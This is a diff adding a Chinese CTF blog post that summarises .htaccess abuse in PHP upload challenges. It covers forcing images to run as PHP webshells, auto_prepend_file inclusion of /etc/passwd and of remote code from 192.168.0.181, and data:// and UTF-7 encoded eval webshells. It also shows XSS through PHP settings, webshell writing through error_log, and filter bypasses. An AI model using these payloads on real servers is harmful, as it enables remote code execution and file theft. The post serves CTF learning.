@@ -1,0 +1,632 @@
+
+
+<!DOCTYPE html>
+<html lang="en" data-default-color-scheme=&#34;auto&#34;>
+
+
+
+<head>
+  <meta charset="UTF-8">
+  <link rel="apple-touch-icon" sizes="76x76" href="/img/favicon.png">
+  <link rel="icon" type="image/png" href="/img/favicon.png">
+  <meta name="viewport"
+        content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no, shrink-to-fit=no">
+  <meta http-equiv="x-ua-compatible" content="ie=edge">
+  
+  <meta name="theme-color" content="#2f4154">
+  <meta name="description" content="">
+  <meta name="author" content="Yu ting">
+  <meta name="keywords" content="">
+  <title>.htaccess总结 - liquor&#39;s blog</title>
+
+  <link  rel="stylesheet" href="https://cdn.staticfile.org/twitter-bootstrap/4.5.3/css/bootstrap.min.css" />
+
+
+  <link  rel="stylesheet" href="https://cdn.staticfile.org/github-markdown-css/4.0.0/github-markdown.min.css" />
+  <link  rel="stylesheet" href="/lib/hint/hint.min.css" />
+
+  
+    
+    
+      
+      <link  rel="stylesheet" href="https://cdn.staticfile.org/highlight.js/10.1.2/styles/github-gist.min.css" />
+    
+  
+
+  
+    <link  rel="stylesheet" href="https://cdn.staticfile.org/fancybox/3.5.7/jquery.fancybox.min.css" />
+  
+
+
+
+<!-- 主题依赖的图标库，不要自行修改 -->
+
+<link rel="stylesheet" href="//at.alicdn.com/t/font_1749284_ba1fz6golrf.css">
+
+
+
+<link rel="stylesheet" href="//at.alicdn.com/t/font_1736178_kmeydafke9r.css">
+
+
+<link  rel="stylesheet" href="/css/main.css" />
+
+<!-- 自定义样式保持在最底部 -->
+
+
+  <script id="fluid-configs">
+    var Fluid = window.Fluid || {};
+    var CONFIG = {"hostname":"liquor-boop.github.io","root":"/","version":"1.8.5","typing":{"enable":true,"typeSpeed":70,"cursorChar":"_","loop":false},"toc":{"enable":true,"headingSelector":"h1,h2,h3,h4,h5,h6","collapseDepth":0},"anchorjs":{"enable":true,"element":"h1,h2,h3,h4,h5,h6","placement":"right","visible":"hover","icon":""},"copy_btn":true,"image_zoom":{"enable":true},"lazyload":{"enable":true,"onlypost":false},"web_analytics":{"enable":false,"baidu":null,"google":null,"gtag":null,"tencent":{"sid":null,"cid":null},"woyaola":null,"cnzz":null,"leancloud":{"app_id":null,"app_key":null,"server_url":null}}};
+  </script>
+  <script  src="/js/utils.js" ></script>
+  <script  src="/js/color-schema.js" ></script>
+<meta name="generator" content="Hexo 5.2.0"></head>
+
+
+<body>
+  <header style="height: 70vh;">
+    <nav id="navbar" class="navbar fixed-top  navbar-expand-lg navbar-dark scrolling-navbar">
+  <div class="container">
+    <a class="navbar-brand"
+       href="/">&nbsp;<strong>Fluid</strong>&nbsp;</a>
+
+    <button id="navbar-toggler-btn" class="navbar-toggler" type="button" data-toggle="collapse"
+            data-target="#navbarSupportedContent"
+            aria-controls="navbarSupportedContent" aria-expanded="false" aria-label="Toggle navigation">
+      <div class="animated-icon"><span></span><span></span><span></span></div>
+    </button>
+
+    <!-- Collapsible content -->
+    <div class="collapse navbar-collapse" id="navbarSupportedContent">
+      <ul class="navbar-nav ml-auto text-center">
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/">
+                <i class="iconfont icon-home-fill"></i>
+                Home
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/archives/">
+                <i class="iconfont icon-archive-fill"></i>
+                Archives
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/categories/">
+                <i class="iconfont icon-category-fill"></i>
+                Categories
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/tags/">
+                <i class="iconfont icon-tags-fill"></i>
+                Tags
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/about/">
+                <i class="iconfont icon-user-fill"></i>
+                About
+              </a>
+            </li>
+          
+        
+        
+          <li class="nav-item" id="search-btn">
+            <a class="nav-link" data-toggle="modal" data-target="#modalSearch">&nbsp;<i
+                class="iconfont icon-search"></i>&nbsp;</a>
+          </li>
+        
+        
+          <li class="nav-item" id="color-toggle-btn">
+            <a class="nav-link" href="javascript:">&nbsp;<i
+                class="iconfont icon-dark" id="color-toggle-icon"></i>&nbsp;</a>
+          </li>
+        
+      </ul>
+    </div>
+  </div>
+</nav>
+
+    <div class="banner intro-2" id="background" parallax=true
+         style="background: url('/img/default.png') no-repeat center center;
+           background-size: cover;">
+      <div class="full-bg-img">
+        <div class="mask flex-center" style="background-color: rgba(0, 0, 0, 0.3)">
+          <div class="page-header text-center fade-in-up">
+            <span class="h2" id="subtitle" title=".htaccess总结">
+              
+            </span>
+
+            
+              <div class="mt-3">
+  
+  
+    <span class="post-meta">
+      <i class="iconfont icon-date-fill" aria-hidden="true"></i>
+      <time datetime="2021-08-10 00:29" pubdate>
+        August 10, 2021 am
+      </time>
+    </span>
+  
+</div>
+
+<div class="mt-1">
+  
+    
+    <span class="post-meta mr-2">
+      <i class="iconfont icon-chart"></i>
+      2.5k 字
+    </span>
+  
+
+  
+    
+    <span class="post-meta mr-2">
+      <i class="iconfont icon-clock-fill"></i>
+      
+      
+      31
+       分钟
+    </span>
+  
+
+  
+  
+</div>
+
+            
+          </div>
+
+          
+        </div>
+      </div>
+    </div>
+  </header>
+
+  <main>
+    
+      
+
+<div class="container-fluid">
+  <div class="row">
+    <div class="d-none d-lg-block col-lg-2"></div>
+    <div class="col-lg-8 nopadding-md">
+      <div class="container nopadding-md" id="board-ctn">
+        <div class="py-5" id="board">
+          <article class="post-content mx-auto">
+            <!-- SEO header -->
+            <h1 style="display: none">.htaccess总结</h1>
+            
+            <div class="markdown-body">
+              <p>经常碰到一些题目需要借助.htaccess，且用法很多，这里来做一个总结。</p>
+<h4 id="概念"><a class="header-anchor" href="#概念">🍭</a>概念</h4>
+<p>.htaccess文件(“分布式配置文件”）,全称是Hypertext Access(超文本入口)。提供了针对目录改变配置的方法，  即，在一个特定的文档目录中放置一个包含一个或多个指令的文件，  以作用于此目录及其所有子目录。作为用户，所能使用的命令受到限制。管理员可以通过Apache的<a target="_blank" rel="noopener" href="https://baike.baidu.com/item/AllowOverride">AllowOverride</a>指令来设置。</p>
+<p>.htaccess 中有 <code>#</code> 单行注释符，且支持 <code>\</code> 拼接上下两行。</p>
+<p>.htaccess 文件中的配置指令作用于 .htaccess 文件所在的<strong>目录及其所有子目录</strong>，但其上级目录也可能会有 .htaccess 文件，而指令是按查找顺序依次生效的，所以一个特定目录下的 .htaccess 文件中的指令可能会覆盖其上级目录中的  .htaccess 文件中的指令，即子目录中的指令会覆盖父目录或者主配置文件中的指令。</p>
+<h4 id="配置"><a class="header-anchor" href="#配置">🍭</a>配置</h4>
+<pre><code class="hljs css"><span class="hljs-selector-tag">AllowOverride</span>  <span class="hljs-selector-tag">All</span>    # 启动<span class="hljs-selector-class">.htaccess</span>文件的使用
+<span class="hljs-selector-tag">AccessFileName</span>  <span class="hljs-selector-class">.config</span>    # 将<span class="hljs-selector-class">.htaccess</span>修改为<span class="hljs-selector-class">.config</span></code></pre>
+<h4 id="作用"><a class="header-anchor" href="#作用">🍭</a>作用</h4>
+<p>可以实现网页301重定向、自定义404错误页面、改变文件扩展名、允许/阻止特定的用户或者目录的访问、禁止目录列表、配置默认文档等功能。</p>
+<h4 id="SetHandler"><a class="header-anchor" href="#SetHandler">🍭</a>SetHandler</h4>
+<p>可以强制所有匹配的文件被一个指定的处理器处理。</p>
+<p>用法：</p>
+<pre><code class="hljs pgsql">SetHandler <span class="hljs-keyword">handler</span>-<span class="hljs-type">name</span>|<span class="hljs-keyword">None</span></code></pre>
+<p>如：</p>
+<pre><code class="hljs applescript">SetHandler <span class="hljs-built_in">application</span>/x-httpd-php<span class="hljs-comment">#当前目录及其子目录下所有文件都会被当做 php 解析</span>
+SetHandler server-status<span class="hljs-comment">#开启 Apache 的服务器状态信息（server-status 是 Apache 自带一个查看 Apache 状态的功能模块），可以查看所有访问本站的记录</span></code></pre>
+<h4 id="AddHandler"><a class="header-anchor" href="#AddHandler">🍭</a>AddHandler</h4>
+<p>实现在文件扩展名与特定的处理器之间建立映射</p>
+<p>用法：</p>
+<pre><code class="hljs mipsasm"><span class="hljs-keyword">AddHandler </span>handler-name <span class="hljs-keyword">extensive </span>[<span class="hljs-keyword">extensive] </span>...</code></pre>
+<p>如：</p>
+<pre><code class="hljs mipsasm"><span class="hljs-keyword">AddHandler </span>cgi-<span class="hljs-keyword">script </span>.xxx<span class="hljs-comment">#将扩展名为 .xxx 的文件作为 CGI 脚本来处理</span></code></pre>
+<h4 id="php-value"><a class="header-anchor" href="#php-value">🍭</a>php_value</h4>
+<p>设定指定的 PHP 的配置值。要清除先前设定的值，把 value 设为 none。但是 php_value 不能用来设定布尔值，如果要设定布尔值的话应该用 php_flag。</p>
+<p>用法：</p>
+<pre><code class="hljs ceylon">php<span class="hljs-number">_</span><span class="hljs-keyword">value</span> name <span class="hljs-keyword">value</span></code></pre>
+<p>不是所有的 PHP 配置都可以用 php_value 来设定，它只能用于 PHP_INI_ALL 或 PHP_INI_PERDIR 类型的指令：</p>
+<p><img src="/2021/08/10/hta/1.png" srcset="/img/loading.gif" alt="1"></p>
+<p>如</p>
+<pre><code class="hljs css"><span class="hljs-selector-tag">php_value</span> <span class="hljs-selector-tag">auto_prepend_file</span> <span class="hljs-selector-tag">images</span><span class="hljs-selector-class">.png</span>#设置访问一个 <span class="hljs-selector-tag">PHP</span> 文件时，在该文件解析之前会先自动包含并解析 <span class="hljs-selector-tag">images</span><span class="hljs-selector-class">.png</span> 文件</code></pre>
+<h4 id="php-flag"><a class="header-anchor" href="#php-flag">🍭</a>php_flag</h4>
+<p>设定布尔值类型的 PHP 配置选项。</p>
+<p>用法：</p>
+<pre><code class="hljs applescript">php_flag <span class="hljs-built_in">name</span> <span class="hljs-keyword">on</span>|off</code></pre>
+<p>php_flag 可以设定的配置也是有范围的：</p>
+<p><img src="/2021/08/10/hta/2.png" srcset="/img/loading.gif" alt="2"></p>
+<p>实例</p>
+<pre><code class="hljs angelscript">php_flag engine <span class="hljs-number">0</span>#将 engine 设置为 <span class="hljs-number">0</span>，即在本目录和子目录中关闭 PHP 解析，可以造成源码泄露</code></pre>
+<h4 id="AddType"><a class="header-anchor" href="#AddType">🍭</a>AddType</h4>
+<p>将给定的文件扩展名映射到指定的内容类型。</p>
+<p>用法：</p>
+<pre><code class="hljs mipsasm"><span class="hljs-keyword">AddType </span>media-type <span class="hljs-keyword">extensive </span>[<span class="hljs-keyword">extensive] </span>...</code></pre>
+<p>如</p>
+<pre><code class="hljs applescript">AddType <span class="hljs-built_in">application</span>/x-httpd-php .gif<span class="hljs-comment">#把 gif 为后缀的文件当做 php 文件解析。</span>
+AddType <span class="hljs-built_in">application</span>/x-httpd-php png jpg gif<span class="hljs-comment">#把 .png .jpg .gif 多个后缀的文件当做 php 解析</span></code></pre>
+<h2 id="利用"><a class="header-anchor" href="#利用">🍭</a>利用</h2>
+<h4 id="图片马解析"><a class="header-anchor" href="#图片马解析">🍭</a>图片马解析</h4>
+<p>在文件上传漏洞中经常遇到上传图片马的情况，如果目标环境开启了  .htaccess 并且上传的黑名单没有限制 .htaccess 文件的话，我们可以先上传 .htaccess  文件，对目标环境的目录进行相应的配置，然后再上传图片，使图片的 PHP 恶意代码得以被直接解析执行。</p>
+<p>常用指令：</p>
+<blockquote>
+<p>SetHandler 指令<br>
+强制将所有匹配的文件被 PHP 处理器处理并解析：</p>
+<pre><code class="hljs shell"><span class="hljs-meta">&gt;</span><span class="bash"><span class="hljs-comment"># 将images.png 当做 php 执行</span></span>
+<span class="hljs-meta">&gt;</span><span class="bash">&lt;FilesMatch <span class="hljs-string">&quot;images.png&quot;</span>&gt;</span>
+SetHandler application/x-httpd-php
+<span class="hljs-meta">&gt;</span><span class="bash">&lt;/FilesMatch&gt;</span></code></pre>
+</blockquote>
+<blockquote>
+<p>AddType 指令</p>
+<p>将给定的文件扩展名映射到 PHP 的内容类型：</p>
+<pre><code class="hljs applescript"><span class="hljs-comment"># 将 .jpg 当做 php 文件解析</span>
+AddType <span class="hljs-built_in">application</span>/x-httpd-php .png</code></pre>
+</blockquote>
+<p>这两种配置都可以使我们上传的非 PHP 类型的 Webshell 被当做 PHP 直接解析.</p>
+<h4 id="文件包含"><a class="header-anchor" href="#文件包含">🍭</a>文件包含</h4>
+<h5 id="本地文件包含"><a class="header-anchor" href="#本地文件包含">🍭</a>本地文件包含</h5>
+<p>在本目录或子目录中有可解析的 PHP 文件时，可以通过 php_value 来设置 auto_prepend_file 或者 auto_append_file  配置选项来让所有的 PHP 文件自动包含一些敏感文件或恶意文件（如WebShell），来触发文件包含。</p>
+<p>如包含 /etc/passwd：</p>
+<blockquote>
+<p>auto_prepend_file</p>
+<pre><code class="hljs awk">php_value auto_prepend_file <span class="hljs-regexp">/etc/</span>passwd</code></pre>
+</blockquote>
+<blockquote>
+<p>auto_append_file</p>
+<pre><code class="hljs awk">php_value auto_append_file <span class="hljs-regexp">/etc/</span>passwd</code></pre>
+</blockquote>
+<p>这两个配置选项用于设置访问一个 PHP 文件时，在该 PHP 文件解析之前会先自动包含并解析的文件。如：目标环境的当前目录中存在至少一个 PHP 文件且上传黑名单没有限制 .htaccess 文件。我们也可以让 index.php 文件包含一个含有 Webshell 的文件来 Getshell，可用于图片马的解析：</p>
+<pre><code class="hljs angelscript">php_value <span class="hljs-built_in">auto</span>_prepend_file images.png
+或:
+php_value <span class="hljs-built_in">auto</span>_append_file images.png</code></pre>
+<h5 id="远程文件包含"><a class="header-anchor" href="#远程文件包含">🍭</a>远程文件包含</h5>
+<p>PHP 的 allow_url_include默认是关闭的，如果开启的话就可以进行远程包含。因为 allow_url_include 的配置范围为  PHP_INI_SYSTEM，所以无法利用 php_flag 指令在 .htaccess 文件中开启。当 allow_url_include=On时<code>.htaccess </code>文件中的设置为：</p>
+<pre><code class="hljs angelscript">php_value <span class="hljs-built_in">auto</span>_prepend_file http:<span class="hljs-comment">//192.168.0.181/phpinfo.txt</span>
+或:
+php_value <span class="hljs-built_in">auto</span>_append_file http:<span class="hljs-comment">//192.168.0.181/phpinfo.txt</span></code></pre>
+<p>远程主机上的phpinfo.txt就可以写一些恶意代码。</p>
+<h4 id="任意代码执行"><a class="header-anchor" href="#任意代码执行">🍭</a>任意代码执行</h4>
+<h5 id="通过-PHP-伪协议"><a class="header-anchor" href="#通过-PHP-伪协议">🍭</a>通过 PHP 伪协议</h5>
+<p>利用 auto_prepend_file 或 auto_append_file 这两个配置项。条件：</p>
+<ul>
+<li>allow_url_fopen=On</li>
+<li>allow_url_include=On</li>
+<li>目标环境的当前目录中存在至少一个 PHP 文件</li>
+</ul>
+<pre><code class="hljs xquery">php_value auto_append_file data://<span class="hljs-type">text</span>/plain;base64,PD9waHAgcGhwaW5mbygpOz8+
+或:
+php_value auto_append_file data://<span class="hljs-type">text</span>/plian,<span class="hljs-meta">%3c</span><span class="hljs-meta">%3fphp</span>+phpinfo()<span class="hljs-meta">%3b</span><span class="hljs-meta">%3f</span><span class="hljs-meta">%3e</span>
+// 如果不使用base64加密则注意需要url编码</code></pre>
+<h5 id="通过解析-htaccess-文件"><a class="header-anchor" href="#通过解析-htaccess-文件">🍭</a>通过解析 .htaccess 文件</h5>
+<blockquote>
+<p>通过包含 .htaccess 自身</p>
+<pre><code class="hljs php-template"><span class="xml">php_value auto_append_file .htaccess</span>
+<span class="xml">#</span><span class="php"><span class="hljs-meta">&lt;?php</span> phpinfo();<span class="hljs-meta">?&gt;</span></span></code></pre>
+</blockquote>
+<blockquote>
+<p>直接将 .htaccess 文件当做 PHP文件处理</p>
+<p>当目标环境当前目录或子目录下没有 PHP 文件的情况下，需要先在 .htaccess 里面设置允许访问 .htaccess 文件，否则会Forbidden：</p>
+<pre><code class="hljs gams">&gt;&lt;<span class="hljs-keyword">Files</span> ~ <span class="hljs-string">&quot;^.ht&quot;</span>&gt;
+Require <span class="hljs-keyword">all</span> granted
+Order allow,deny
+Allow from <span class="hljs-keyword">all</span>
+&gt;&lt;/<span class="hljs-keyword">Files</span>&gt;</code></pre>
+<p>然后再设置将 .htaccess 指定当做 PHP 文件处理并解析：</p>
+<pre><code class="hljs php-template"><span class="xml">&gt;SetHandler application/x-httpd-php</span>
+<span class="xml">&gt;# </span><span class="php"><span class="hljs-meta">&lt;?php</span> phpinfo();<span class="hljs-meta">?&gt;</span></span></code></pre>
+<p>直接访问 .htaccess 文件即可把 .htaccess 文件当做 PHP 文件处理并执行里面的 PHP 代码。</p>
+</blockquote>
+<h4 id="进行-XSS-攻击"><a class="header-anchor" href="#进行-XSS-攻击">🍭</a>进行 XSS 攻击</h4>
+<h5 id="通过设置-highlight-file"><a class="header-anchor" href="#通过设置-highlight-file">🍭</a>通过设置 highlight_file</h5>
+<p>我们可以通过 .htaccess 文件设定 highlight.comment 选项，指定需要高亮的内容，从而进行 XSS。</p>
+<p>.htaccess：</p>
+<pre><code class="hljs xml">php_value highlight.comment &#x27;&quot;&gt;<span class="hljs-tag">&lt;<span class="hljs-name">script</span>&gt;</span>alert(1);<span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span>&#x27;</code></pre>
+<p>index.php:</p>
+<pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span>
+highlight_file(<span class="hljs-keyword">__FILE__</span>);
+<span class="hljs-comment">// comment</span></code></pre>
+<p>访问index.php即可触发 XSS。</p>
+<h5 id="通过错误消息链接"><a class="header-anchor" href="#通过错误消息链接">🍭</a>通过错误消息链接</h5>
+<p>.htaccess ：</p>
+<pre><code class="hljs apache"><span class="hljs-attribute">php_flag</span> display_errors <span class="hljs-number">1</span>
+<span class="hljs-attribute">php_flag</span> html_errors <span class="hljs-number">1</span>
+<span class="hljs-attribute">php_value</span> docref_root <span class="hljs-string">&quot;&#x27;&gt;&lt;script&gt;alert(1);&lt;/script&gt;&quot;</span></code></pre>
+<p>index.php:</p>
+<pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span>
+<span class="hljs-keyword">include</span>(<span class="hljs-string">&#x27;foo&#x27;</span>); <span class="hljs-comment">// 这里会报错</span></code></pre>
+<h4 id="自定义错误文件（可写Webshell）"><a class="header-anchor" href="#自定义错误文件（可写Webshell）">🍭</a>自定义错误文件（可写Webshell）</h4>
+<p>error_log 可以将 PHP 运行报错的记录写到指定文件中，因此我们可以通过 .htaccess 文件设定 error_log 选项来自定义错误文件的存储路径，并以此来写入Webshell：</p>
+<pre><code class="hljs awk">php_value error_log <span class="hljs-regexp">/var/</span>www<span class="hljs-regexp">/html/</span>shell.php
+php_value include_path <span class="hljs-string">&quot;&lt;?php phpinfo(); __halt_compiler();&quot;</span>
+<span class="hljs-comment"># include_path 用来将include()的默认目录路径改变</span></code></pre>
+<p>index.php和上面一样，访问 index.php，会报错并记录在 shell.php 文件中，但是 <code>&lt;</code> 等字符会经过 html 编码，我们需要用 UTF-7 编码格式来绕过，详见：buu 里的[XNUCA2019Qualifier]EasyPHP</p>
+<h4 id="绕过-特殊字符"><a class="header-anchor" href="#绕过-特殊字符">🍭</a>绕过 &lt;? 特殊字符</h4>
+<p>有时候目标环境会限制我们上传或写入的文件内容中不能存在 <code>&lt;?</code> 等特殊字符，我们同样可以使用 .htaccess 来绕过。</p>
+<h5 id="Base64-编码绕过"><a class="header-anchor" href="#Base64-编码绕过">🍭</a>Base64 编码绕过</h5>
+<p>利用 auto_append_file 和 PHP 伪协议，比如我们在一个图片中写入经过base64编码后的 Webshell，然后我们便可以使用 auto_append_file 配合 php://filter 将其包含进来：</p>
+<pre><code class="hljs nginx"><span class="hljs-attribute">php_value</span> auto_append_file <span class="hljs-string">&quot;php://filter/convert.base64-decode/resource=images.png&quot;</span>
+<span class="hljs-comment"># images.png 中是经过base64编码后的Webshell</span></code></pre>
+<p>使用data://协议也可以:</p>
+<pre><code class="hljs apache"><span class="hljs-attribute">php_value</span> auto_append_file data://text/plain;base<span class="hljs-number">64</span>,PD<span class="hljs-number">9</span>waHAgcGhwaW<span class="hljs-number">5</span>mbygpOz<span class="hljs-number">8</span>+</code></pre>
+<h5 id="UTF-7-编码格式绕过"><a class="header-anchor" href="#UTF-7-编码格式绕过">🍭</a>UTF-7 编码格式绕过</h5>
+<p>如我们在一个图片中写入 UTF-7 编码格式的 Webshell：</p>
+<pre><code class="hljs swift"><span class="hljs-comment">// images.png</span>
++<span class="hljs-type">ADw?</span>php eval(+<span class="hljs-type">ACQAXw</span>-<span class="hljs-type">POST</span>+<span class="hljs-type">AFs</span>-whoami+<span class="hljs-type">AF0</span>)+<span class="hljs-type">ADs?</span>+<span class="hljs-type">AD4</span>-</code></pre>
+<ul>
+<li>使用 auto_append_file 将其包含进来并设置编码格式为 UTF-7 ：</li>
+</ul>
+<pre><code class="hljs stylus">php_value auto_append_file images.png
+php_flag zend<span class="hljs-selector-class">.multibyte</span> <span class="hljs-number">1</span>
+php_value zend<span class="hljs-selector-class">.script_encoding</span> <span class="hljs-string">&quot;UTF-7&quot;</span></code></pre>
+<ul>
+<li>使用 php://filer 伪协议进行 UTF-7 与 UTF-8 之间的转换（UTF-16、UTF-32 也可以）：</li>
+</ul>
+<pre><code class="hljs ceylon">php<span class="hljs-number">_</span><span class="hljs-keyword">value</span> auto<span class="hljs-number">_</span>append<span class="hljs-number">_f</span>ile <span class="hljs-string">&quot;php://filter/read=convert.iconv.utf-7.utf-8/resource=images.png&quot;</span></code></pre>
+<ul>
+<li>使用 .htaccess 自身包含来执行 Webshell：</li>
+</ul>
+<pre><code class="hljs mipsasm">php_value auto_append_file .htaccess
+php_flag zend.<span class="hljs-keyword">multibyte </span><span class="hljs-number">1</span>
+php_value zend.<span class="hljs-keyword">script_encoding </span><span class="hljs-string">&quot;UTF-7&quot;</span>
+<span class="hljs-comment"># +ADw?php eval(+ACQAXw-POST+AFs-whoami+AF0)+ADs?+AD4-</span></code></pre>
+<h2 id="Bypass"><a class="header-anchor" href="#Bypass">🍭</a>Bypass</h2>
+<h4 id="绕过脏字符"><a class="header-anchor" href="#绕过脏字符">🍭</a>绕过脏字符</h4>
+<p>有的题目会在我们上传或写入的文件中加入一个混乱的字符（脏字符），由于这些字符不是 .htaccess  文件的语法或指令，会使我们的.htaccess文件不生效，出现响应500的问题。故我们要采用 <code>#</code> 对脏字符进行注释，或使用反斜杠 <code>\</code> 将换行符转义成普通字符。</p>
+<h4 id="绕过关键字过滤"><a class="header-anchor" href="#绕过关键字过滤">🍭</a>绕过关键字过滤</h4>
+<p>也可以使用反斜杠 <code>\</code> 加换行来实现。比如题目过滤了 type、php 等敏感字符，我们可以编辑 .htaccess：</p>
+<pre><code class="hljs livescript">AddTy<span class="hljs-string">\</span>
+pe application/x-httpd-ph<span class="hljs-string">\</span>
+p .png
+<span class="hljs-comment"># 即: AddType application/x-httpd-php .png</span></code></pre>
+<h4 id="绕过对上传图片的尺寸限制"><a class="header-anchor" href="#绕过对上传图片的尺寸限制">🍭</a>绕过对上传图片的尺寸限制</h4>
+<p>有的题目在图片上传区会使用 <code>getimagesize()</code> 等函数对上传的图片进行尺寸限制，只允许上传指定大小尺寸的图片，并且会使用 <code>exif_imagetype()</code> 函数读取第一个字节并检查其图片类型。此时如果可以上传 .htaccess 来解析图片的话我们还需要让 .htaccess 的尺寸和经过  <code>exif_imagetype()</code>  检测。我们可以使用 <code>exif_imagetype()</code> 函数支持的 WBMP 图像类型绕过。WBMP（Wireless Bitmap）是一种移动计算机设备使用的标准图像格式，是一种纯文本二进制图像格式的图片，实例：</p>
+<pre><code class="hljs apache"><span class="hljs-comment">#define test_width 16</span>
+<span class="hljs-comment">#define test_height 7</span>
+<span class="hljs-attribute">static</span> char test_bits[] = &#123;
+<span class="hljs-attribute">0x13</span>, <span class="hljs-number">0</span>x<span class="hljs-number">00</span>, <span class="hljs-number">0</span>x<span class="hljs-number">15</span>, <span class="hljs-number">0</span>x<span class="hljs-number">00</span>, <span class="hljs-number">0</span>x<span class="hljs-number">93</span>, <span class="hljs-number">0</span>xcd, <span class="hljs-number">0</span>x<span class="hljs-number">55</span>, <span class="hljs-number">0</span>xa<span class="hljs-number">5</span>, <span class="hljs-number">0</span>x<span class="hljs-number">93</span>, <span class="hljs-number">0</span>xc<span class="hljs-number">5</span>, <span class="hljs-number">0</span>x<span class="hljs-number">00</span>, <span class="hljs-number">0</span>x<span class="hljs-number">80</span>,
+<span class="hljs-attribute">0x00</span>, <span class="hljs-number">0</span>x<span class="hljs-number">60</span> &#125;;</code></pre>
+<p>WBMP 图像的开头可以使用 <code>#</code> 设置图像的尺寸大小，假设题目限制我们上传的图片尺寸必须为1x1，我们在上传.htaccess时就可以用 WBMP 绕过：</p>
+<pre><code class="hljs cpp"><span class="hljs-meta">#<span class="hljs-meta-keyword">define</span> width 1</span>
+<span class="hljs-meta">#<span class="hljs-meta-keyword">define</span> height 1</span>
+AddType application/x-httpd-php images.png</code></pre>
+<p>实例写在另一篇文章：<a href="https://liquor-boop.github.io/2021/08/11/ffi/">buu（八)</a></p>
+<p>参考：<a target="_blank" rel="noopener" href="https://whoamianony.top/2021/04/30/Web%E5%AE%89%E5%85%A8/%E4%B8%8E%20.htaccess%20%E7%9B%B8%E5%85%B3%E7%9A%84%E5%A5%87%E6%B7%AB%E6%8A%80%E5%B7%A7/">https://whoamianony.top/2021/04/30/Web安全/与 .htaccess 相关的奇淫技巧/</a></p>
+
+            </div>
+            <hr>
+            <div>
+              <div class="post-metas mb-3">
+                
+                
+                  <div class="post-meta">
+                    <i class="iconfont icon-tags"></i>
+                    
+                      <a class="hover-with-bg" href="/tags/htaccess/">.htaccess</a>
+                    
+                  </div>
+                
+              </div>
+              
+                <p class="note note-warning">本博客所有文章除特别声明外，均采用 <a target="_blank" href="https://creativecommons.org/licenses/by-sa/4.0/deed.zh" rel="nofollow noopener noopener">CC BY-SA 4.0 协议</a> ，转载请注明出处！</p>
+              
+              
+                <div class="post-prevnext row">
+                  <article class="post-prev col-6">
+                    
+                    
+                      <a href="/2021/08/11/ffi/">
+                        <i class="iconfont icon-arrowleft"></i>
+                        <span class="hidden-mobile">buu（八）</span>
+                        <span class="visible-mobile">Previous</span>
+                      </a>
+                    
+                  </article>
+                  <article class="post-next col-6">
+                    
+                    
+                      <a href="/2021/08/08/cmd/">
+                        <span class="hidden-mobile">PHP无参数RCE</span>
+                        <span class="visible-mobile">Next</span>
+                        <i class="iconfont icon-arrowright"></i>
+                      </a>
+                    
+                  </article>
+                </div>
+              
+            </div>
+
+            
+          </article>
+        </div>
+      </div>
+    </div>
+    
+      <div class="d-none d-lg-block col-lg-2 toc-container" id="toc-ctn">
+        <div id="toc">
+  <p class="toc-header"><i class="iconfont icon-list"></i>&nbsp;TOC</p>
+  <div class="toc-body" id="toc-body"></div>
+</div>
+
+      </div>
+    
+  </div>
+</div>
+
+<!-- Custom -->
+
+
+    
+
+    
+      <a id="scroll-top-button" href="#" role="button">
+        <i class="iconfont icon-arrowup" aria-hidden="true"></i>
+      </a>
+    
+
+    
+      <div class="modal fade" id="modalSearch" tabindex="-1" role="dialog" aria-labelledby="ModalLabel"
+     aria-hidden="true">
+  <div class="modal-dialog modal-dialog-scrollable modal-lg" role="document">
+    <div class="modal-content">
+      <div class="modal-header text-center">
+        <h4 class="modal-title w-100 font-weight-bold">Search</h4>
+        <button type="button" id="local-search-close" class="close" data-dismiss="modal" aria-label="Close">
+          <span aria-hidden="true">&times;</span>
+        </button>
+      </div>
+      <div class="modal-body mx-3">
+        <div class="md-form mb-5">
+          <input type="text" id="local-search-input" class="form-control validate">
+          <label data-error="x" data-success="v"
+                 for="local-search-input">keyword</label>
+        </div>
+        <div class="list-group" id="local-search-result"></div>
+      </div>
+    </div>
+  </div>
+</div>
+    
+
+    
+  </main>
+
+  <footer class="text-center mt-5 py-3">
+  <div class="footer-content">
+     <a href="https://hexo.io" target="_blank" rel="nofollow noopener"><span>Hexo</span></a> <i class="iconfont icon-love"></i> <a href="https://github.com/fluid-dev/hexo-theme-fluid" target="_blank" rel="nofollow noopener"><span>Fluid</span></a> 
+  </div>
+  
+
+  
+
+  
+</footer>
+
+<!-- SCRIPTS -->
+
+  <script  src="https://cdn.staticfile.org/nprogress/0.2.0/nprogress.min.js" ></script>
+  <link  rel="stylesheet" href="https://cdn.staticfile.org/nprogress/0.2.0/nprogress.min.css" />
+
+  <script>
+    NProgress.configure({"showSpinner":false,"trickleSpeed":200})
+    NProgress.start()
+    document.addEventListener('DOMContentLoaded', function() {
+      window.NProgress && window.NProgress.inc();
+    })
+    window.addEventListener('load', function() {
+      NProgress.done();
+    })
+  </script>
+
+
+<script  src="https://cdn.staticfile.org/jquery/3.5.1/jquery.min.js" ></script>
+<script  src="https://cdn.staticfile.org/twitter-bootstrap/4.5.3/js/bootstrap.min.js" ></script>
+<script  src="/js/debouncer.js" ></script>
+<script  src="/js/events.js" ></script>
+<script  src="/js/plugins.js" ></script>
+
+<!-- Plugins -->
+
+
+  
+    <script  src="/js/lazyload.js" ></script>
+  
+
+
+
+  
+
+
+
+  <script  src="https://cdn.staticfile.org/tocbot/4.12.0/tocbot.min.js" ></script>
+
+
+
+  <script  src="https://cdn.staticfile.org/fancybox/3.5.7/jquery.fancybox.min.js" ></script>
+
+
+
+  <script  src="https://cdn.staticfile.org/anchor-js/4.3.0/anchor.min.js" ></script>
+
+
+
+  <script defer src="https://cdn.staticfile.org/clipboard.js/2.0.6/clipboard.min.js" ></script>
+
+
+
+
+
+  <script  src="https://cdn.staticfile.org/typed.js/2.0.11/typed.min.js" ></script>
+  <script>
